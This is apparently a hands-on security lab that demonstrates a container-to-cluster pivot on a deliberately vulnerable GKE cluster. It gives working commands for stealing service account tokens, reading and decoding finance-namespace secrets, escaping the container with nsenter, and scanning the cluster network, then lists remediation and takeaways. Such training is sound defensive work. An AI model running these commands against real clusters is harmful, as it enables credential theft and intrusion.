# Lab 07: Container to Cluster Pivot

> **Pivot**: Container Runtime -> Kubernetes Cluster | **Difficulty**: Advanced | **Duration**: 40 min

## Objective

Demonstrate how an attacker with access to a compromised container can escalate privileges into the Kubernetes cluster control plane. Starting from an interactive shell inside the vulnerable application pod, you will steal the service account token, query the Kubernetes API, access secrets across namespaces, escape the container to the host node, and perform network reconnaissance across the cluster.

## OWASP Mapping

- **A01:2021 - Broken Access Control**: Over-privileged service account with cluster-admin role
- **A05:2021 - Security Misconfiguration**: Privileged containers, automounted tokens, missing network policies
- **A07:2021 - Identification and Authentication Failures**: Bearer token with excessive scope

## GCC Compliance Impact

| Framework | Control | Description |
|-----------|---------|-------------|
| CIS GKE Benchmark | 5.1.1 | Ensure cluster-admin role is only used where required |
| CIS GKE Benchmark | 5.1.3 | Minimize wildcard use in Roles and ClusterRoles |
| CIS GKE Benchmark | 5.2.1 | Minimize the admission of privileged containers |
| CIS GKE Benchmark | 5.2.4 | Minimize the admission of containers wishing to share the host network namespace |
| NIST SP 800-190 | 4.3.2 | Orchestrator access controls |
| PCI DSS 4.0 | 7.2.2 | Access is assigned based on job classification and function |
| SOC 2 | CC6.3 | Restricts access to authorized individuals |
| ISO 27001 | A.8.3 | Information access restriction |

## Prerequisites

- Completed Lab 02 (container access confirmed) or Lab 06 (service account token extracted)
- `kubectl` access to the GKE cluster from your workstation
- Ability to exec into the vulnerable application pod
- Basic understanding of Kubernetes RBAC and API structure

## Attack Steps

### Step 1: Access the Container and Read the Service Account Token

Exec into the vulnerable application pod and extract the Kubernetes service account token mounted by default into every pod.

**Command:**

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Expected Output:**

```text
eyJhbGciOiJSUzI1NiIsImtpZCI6Inh4eCJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhaS1nb3Zlcm5hbmNlIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InZ1bG4tYXBwLXNhLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InZ1bG4tYXBwLXNhIn0.SIGNATURE
```

The token is a JWT (JSON Web Token) signed by the Kubernetes API server. It identifies the pod as the `vuln-app-sa` service account in the `ai-governance` namespace. Kubernetes automatically mounts this token at a well-known path in every pod unless `automountServiceAccountToken: false` is explicitly set in the pod spec or service account configuration.

### Step 2: Set the Token as an Environment Variable

Store the token in a shell variable for use in subsequent API calls from within the container.

**Command:**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | head -c 50
```

**Expected Output:**

```text
eyJhbGciOiJSUzI1NiIsImtpZCI6Inh4eCJ9.eyJpc3Mi
```

Setting the token as a variable allows us to use it across multiple `curl` commands without re-reading the file each time. The partial echo confirms the token was captured successfully without exposing the full value in logs.

### Step 3: Query the Kubernetes API for Namespaces

Use the stolen token to authenticate to the Kubernetes API server and enumerate all namespaces in the cluster.

**Command:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces | \
  grep '"name"' | head -20
```

**Expected Output:**

```text
        "name": "ai-governance",
        "name": "default",
        "name": "finance-prod",
        "name": "kube-node-lease",
        "name": "kube-public",
        "name": "kube-system",
```

The service account can list all namespaces because it has `cluster-admin` privileges. This reveals the full organizational structure of the cluster, including the sensitive `finance-prod` namespace. A properly scoped service account would only have access to its own namespace, and this request would return a `403 Forbidden` response.

### Step 4: List Pods in the Finance Production Namespace

Pivot into the `finance-prod` namespace to discover what workloads are running in the financial services environment.

**Command:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/finance-prod/pods | \
  grep '"name"' | head -10
```

**Expected Output:**

```text
        "name": "finance-api-7b8c9d0e1f-abc12",
        "name": "finance-db-5f6a7b8c9d-def34",
        "name": "payment-processor-3d4e5f6a7b-ghi56",
```

The attacker can now see all pods running in the finance production namespace. This information reveals the architecture of the financial system, including database pods and payment processors -- high-value targets for data exfiltration or lateral movement.

### Step 5: List Secrets in the Finance Production Namespace

Enumerate all Kubernetes secrets stored in the `finance-prod` namespace.

**Command:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/finance-prod/secrets | \
  grep '"name"' | head -10
```

**Expected Output:**

```text
        "name": "finance-db-credentials",
        "name": "payment-api-keys",
        "name": "finance-tls-cert",
        "name": "default-token-xxxxx",
```

Kubernetes secrets in the `finance-prod` namespace are fully accessible because the `vuln-app-sa` service account has cluster-wide `get`, `list`, and `watch` permissions on all resources. This is the direct consequence of binding a `cluster-admin` ClusterRole to a workload service account.

### Step 6: Read and Decode a Secret

Extract the contents of the finance database credentials secret and decode the base64-encoded values.

**Command:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/finance-prod/secrets/finance-db-credentials | \
  grep -A1 '"data"'
```

**Expected Output:**

```text
  "data": {
    "username": "ZmluYW5jZS1hZG1pbg==",
    "password": "RmluQGRtaW4jMjAyNCFTZWN1cmU=",
    "connection-string": "cG9zdGdyZXNxbDovL2ZpbmFuY2UtYWRtaW46RmluQGRtaW4jMjAyNCFTZWN1cmVAZmluYW5jZS1kYi5maW5hbmNlLXByb2Quc3ZjOjU0MzIvZmluYW5jZWRi"
```

**Command:**

```bash
echo "ZmluYW5jZS1hZG1pbg==" | base64 -d && echo ""
echo "RmluQGRtaW4jMjAyNCFTZWN1cmU=" | base64 -d && echo ""
```

**Expected Output:**

```text
finance-admin
Fin@dmin#2024!Secure
```

Kubernetes secrets are only base64-encoded, not encrypted. Anyone with read access to the secret resource can trivially decode the values. This reveals production database credentials for the finance system, enabling direct database access and potential financial data exfiltration.

### Step 7: Escape the Container to the Host Node

Because the pod runs with `privileged: true` and `hostNetwork: true`, use `nsenter` to break out of the container namespace and access the underlying GKE node.

**Command:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**Expected Output:**

```text
root@gke-vuln-cluster-default-pool-xxxxxxxx-xxxx:/#
```

The `nsenter` command enters the namespaces of PID 1 on the host (the init process), effectively escaping the container entirely. The flags `--mount --uts --ipc --net --pid` specify that we enter all namespace types: mount (filesystem), UTS (hostname), IPC (inter-process communication), network, and process. The prompt changes to show the GKE node hostname, confirming a successful container escape. This is only possible because the container was deployed with `privileged: true`, which grants access to all host devices and disables most security isolation mechanisms.

### Step 8: Access the Kubelet on the Host

After escaping to the host, interact with the kubelet API to enumerate all pods running on this node.

**Command:**

```bash
curl -sk https://localhost:10250/pods | python3 -m json.tool | grep '"name"' | head -20
```

**Expected Output:**

```text
            "name": "vuln-app-xxxxxxxx-xxxxx",
            "name": "ai-service-xxxxxxxx-xxxxx",
            "name": "kube-proxy-xxxxx",
            "name": "gke-metrics-agent-xxxxx",
            "name": "fluentbit-gke-xxxxx",
```

The kubelet API on port 10250 provides detailed information about every pod on the node, including their configurations, environment variables, and mounted volumes. From the host, the attacker can see all workloads regardless of namespace boundaries, including system components.

### Step 9: Scan the Cluster Network

Use `nmap` (pre-installed in the container) to perform network reconnaissance and discover other services running in the cluster.

**Command:**

```bash
nmap -sT -p 80,443,5432,8080,8081,10250,10255,2379 10.96.0.0/16 --open -T4 2>/dev/null | grep -B2 "open"
```

**Expected Output:**

```text
Nmap scan report for 10.96.0.1
  443/tcp open  https

Nmap scan report for 10.96.45.12
  5432/tcp open  postgresql

Nmap scan report for 10.96.78.34
  8081/tcp open  tproxy

Nmap scan report for 10.96.120.5
  2379/tcp open  etcd-client
```

The network scan reveals the entire cluster service topology: the Kubernetes API server, PostgreSQL databases, the AI service, and critically, the etcd datastore. Because no NetworkPolicies are in place, every pod can communicate with every other service in the cluster. The exposed etcd port (2379) is particularly dangerous -- etcd stores all Kubernetes cluster state including secrets in their unencrypted form.

## Remediation

1. **Disable Automatic Token Mounting**: Set `automountServiceAccountToken: false` on all service accounts and pod specs that do not require Kubernetes API access.

2. **Apply Least-Privilege RBAC**: Replace the `cluster-admin` ClusterRoleBinding with namespace-scoped Roles granting only the specific permissions required by the application. No workload service account should have cluster-wide admin access.

3. **Enforce Default-Deny NetworkPolicies**: Deploy NetworkPolicies in every namespace that deny all ingress and egress by default, then explicitly allow only required communication paths.

4. **Prohibit Privileged Containers**: Use Pod Security Standards (set to `restricted` profile) or OPA Gatekeeper policies to prevent `privileged: true`, `hostNetwork: true`, and `hostPID: true` configurations.

5. **Enable Workload Identity**: Replace node-level service accounts with GKE Workload Identity, which binds Kubernetes service accounts to GCP IAM service accounts with fine-grained permissions.

6. **Encrypt Kubernetes Secrets**: Enable envelope encryption for etcd secrets using GCP KMS, and consider using GCP Secret Manager for sensitive credentials instead of Kubernetes secrets.

7. **Restrict Kubelet API Access**: Configure kubelet authentication and authorization to prevent anonymous access to the kubelet API on port 10250.

8. **Run Non-Root Containers**: Set `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, and drop all capabilities with `capabilities: { drop: ["ALL"] }` in the pod security context.

## Key Takeaways

- A compromised container with a cluster-admin service account token has unrestricted access to every resource in every namespace across the entire Kubernetes cluster.
- Kubernetes secrets are only base64-encoded and are trivially decoded by any principal with read access -- they are not encrypted unless envelope encryption is explicitly configured.
- Privileged containers with host namespace access allow trivial container escape using `nsenter`, collapsing the isolation boundary between container and host.
- The absence of NetworkPolicies creates a flat network where any compromised pod can reach any service, including cluster infrastructure components like etcd.
- The pivot from container to cluster represents a critical escalation boundary -- a single over-privileged pod can compromise the entire cluster control plane and all workloads running on it.
